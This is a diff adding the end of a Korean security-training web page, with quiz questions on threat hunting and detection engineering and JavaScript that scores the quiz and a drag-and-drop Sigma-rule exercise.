+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq3" value="2" class="mt-1 shrink-0"><span>정상적으로 발생해야 할 텔레메트리가 사라진 것을 탐지하는 것</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq3" value="3" class="mt-1 shrink-0"><span>네트워크에 연결되지 않은 호스트를 찾는 것</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq3" value="4" class="mt-1 shrink-0"><span>비밀번호 없는 계정을 탐지하는 것</span></label>
+                </div>
+
+                <!-- AQ4 -->
+                <div class="space-y-3 mb-6">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q4. Detection Engineering의 올바른 순서는?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq4" value="1" class="mt-1 shrink-0"><span>가설 → 규칙 작성 → 테스트 → 배포 → 튜닝</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq4" value="2" class="mt-1 shrink-0"><span>배포 → 테스트 → 튜닝 → 가설 → 규칙 작성</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq4" value="3" class="mt-1 shrink-0"><span>규칙 작성 → 배포 → 가설 → 튜닝 → 테스트</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq4" value="4" class="mt-1 shrink-0"><span>테스트 → 가설 → 배포 → 규칙 작성 → 튜닝</span></label>
+                </div>
+
+                <!-- AQ5 -->
+                <div class="space-y-3 mb-6">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q5. Threat Hunting과 Detection의 가장 큰 차이점은?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq5" value="1" class="mt-1 shrink-0"><span>Hunting은 능동적으로 미지의 위협을 탐색하고, Detection은 사전 규칙 기반 수동 알림</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq5" value="2" class="mt-1 shrink-0"><span>Hunting은 자동화되고, Detection은 수동이다</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq5" value="3" class="mt-1 shrink-0"><span>Hunting은 네트워크만, Detection은 호스트만 담당한다</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq5" value="4" class="mt-1 shrink-0"><span>차이가 없다. 동의어이다</span></label>
+                </div>
+
+                <button onclick="checkAdvQuiz()" class="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-bold rounded-xl transition-colors text-sm">종합 퀴즈 채점하기</button>
+                <div id="adv-quiz-result" class="hidden"></div>
+            </div>
+        </section>
+
+    </main>
+    </div>
+
+    <script>
+        function toggleTheme() {
+            var html = document.documentElement;
+            html.classList.toggle('dark');
+            document.getElementById('theme-icon').textContent = html.classList.contains('dark') ? '☀️' : '🌙';
+            localStorage.setItem('gotroot_theme', html.classList.contains('dark') ? 'dark' : 'light');
+        }
+        if (localStorage.getItem('gotroot_theme') === 'dark') { document.documentElement.classList.add('dark'); document.getElementById('theme-icon').textContent = '☀️'; }
+
+        function go(id) {
+            var el = document.getElementById(id);
+            if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        /* ── Sigma 빈칸 채우기 (데스크톱 드래그 + 모바일 터치) ── */
+        var _dragValue = '';
+        function dragStart(e) { _dragValue = e.target.getAttribute('data-value'); e.dataTransfer.setData('text/plain', _dragValue); }
+        function dropBlank(e) {
+            e.preventDefault();
+            var blank = e.target;
+            if (!blank.classList.contains('code-blank')) return;
+            blank.textContent = _dragValue;
+            blank.setAttribute('data-filled', _dragValue);
+            blank.style.minWidth = 'auto';
+        }
+
+        /* ── 모바일 터치 폴백 ── */
+        var _touchDragEl = null;
+        var _touchClone = null;
+        function initTouchDrag() {
+            document.querySelectorAll('.drag-item').forEach(function(item) {
+                item.addEventListener('touchstart', function(e) {
+                    _dragValue = item.getAttribute('data-value');
+                    _touchDragEl = item;
+                    _touchClone = item.cloneNode(true);
+                    _touchClone.style.cssText = 'position:fixed;z-index:9999;pointer-events:none;opacity:0.85;transform:scale(1.1);';
+                    var t = e.touches[0];
+                    _touchClone.style.left = (t.clientX - 40) + 'px';
+                    _touchClone.style.top = (t.clientY - 20) + 'px';
+                    document.body.appendChild(_touchClone);
+                    item.style.opacity = '0.4';
+                }, { passive: true });
+                item.addEventListener('touchmove', function(e) {
+                    e.preventDefault();
+                    if (!_touchClone) return;
+                    var t = e.touches[0];
+                    _touchClone.style.left = (t.clientX - 40) + 'px';
+                    _touchClone.style.top = (t.clientY - 20) + 'px';
+                }, { passive: false });
+                item.addEventListener('touchend', function(e) {
+                    if (_touchClone) { _touchClone.remove(); _touchClone = null; }
+                    if (_touchDragEl) { _touchDragEl.style.opacity = '1'; }
+                    var t = e.changedTouches[0];
+                    var target = document.elementFromPoint(t.clientX, t.clientY);
+                    if (target && target.classList.contains('code-blank')) {
+                        target.textContent = _dragValue;
+                        target.setAttribute('data-filled', _dragValue);
+                        target.style.minWidth = 'auto';
+                    }
+                    _touchDragEl = null;
+                });
+            });
+        }
+        if ('ontouchstart' in window) { document.addEventListener('DOMContentLoaded', initTouchDrag); }
+        function checkSigmaFill() {
+            var blanks = document.querySelectorAll('.code-blank');
+            var correct = 0;
+            blanks.forEach(function(b) {
+                var filled = b.getAttribute('data-filled') || '';
+                var answer = b.getAttribute('data-answer');
+                b.classList.remove('correct','wrong');
+                if (filled === answer) { correct++; b.classList.add('correct'); }
+                else if (filled) { b.classList.add('wrong'); }
+                else { b.classList.add('wrong'); b.textContent = '빈칸'; }
+            });
+            var rb = document.getElementById('sigma-fill-result');
+            rb.className = 'mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm';
+            rb.classList.remove('hidden');
+            if (correct === 6) {
+                rb.classList.add('bg-[#9DD9D2]/30','border','border-[#9DD9D2]','text-[#0f766e]','dark:text-[#9DD9D2]');
+                rb.innerHTML = '✅ 완벽! 6/6 — Sigma 규칙의 구조를 정확히 이해하고 있습니다.';
+            } else {
+                rb.classList.add('bg-red-100','border','border-red-400','text-red-700','dark:bg-red-900/50','dark:text-red-400');
+                rb.innerHTML = '❌ ' + correct + '/6 정답. 틀린 빈칸(빨간색)을 확인하고 다시 시도해 보세요.';
+            }
+        }
+        function resetSigmaFill() {
+            document.querySelectorAll('.code-blank').forEach(function(b) {
+                b.textContent = '?'; b.removeAttribute('data-filled');
+                b.classList.remove('correct','wrong'); b.style.minWidth = '80px';
+            });
+            var rb = document.getElementById('sigma-fill-result');
+            rb.classList.add('hidden');
+        }
+
+        /* ── 종합 퀴즈 ── */
+        function checkAdvQuiz() {
+            var answers = {aq1:'2', aq2:'2', aq3:'2', aq4:'1', aq5:'1'};
+            var score = 0; var total = 5;
+            for (var key in answers) {
+                var sel = document.querySelector('input[name="'+key+'"]:checked');
+                if (!sel) { alert('모든 문제의 답을 선택해주세요.'); return; }
+                if (sel.value === answers[key]) score++;
+            }
+            var rb = document.getElementById('adv-quiz-result');
+            rb.className = 'mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm';
+            rb.classList.remove('hidden');
+            if (score >= 4) {
+                rb.classList.add('bg-[#9DD9D2]/30','border','border-[#9DD9D2]','text-[#0f766e]','dark:text-[#9DD9D2]');
+                rb.innerHTML = '✅ ' + score + '/' + total + ' 정답! 고급 탐지·우회·재탐지를 정확히 이해하고 있습니다.';
+            } else {
+                rb.classList.add('bg-red-100','border','border-red-400','text-red-700','dark:bg-red-900/50','dark:text-red-400');
+                rb.innerHTML = '❌ ' + score + '/' + total + ' 정답입니다. 관련 챕터를 다시 복습해 보세요.';
+            }
+        }
+
+        var observerOptions = { root: document.getElementById('main-scroll'), rootMargin: '0px 0px -40% 0px', threshold: 0.1 };
+        var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+                if (entry.isIntersecting) {
+                    entry.target.classList.remove('opacity-0','translate-y-10');
+                    entry.target.classList.add('opacity-100','translate-y-0');
+                    var id = entry.target.getAttribute('id');
+                    document.querySelectorAll('.nav-item').forEach(function(nav) {
+                        nav.classList.remove('active');
+                        if (nav.getAttribute('data-target') === id) nav.classList.add('active');
+                    });
+                }
+            });
+        }, observerOptions);
+        document.querySelectorAll('.section-observe').forEach(function(s) { observer.observe(s); });
+        window.onload = function() { setTimeout(function() { go('ch1'); }, 100); };
+    </script>
+    </div>
+<script src="/edu/graphic-link.js"></script>
+<script src="/edu/progress-tracker.js"></script>
+<script src="/edu/breadcrumb.js"></script>
+    <script src="/wiki-button.js"></script>
+</body>
+</html>
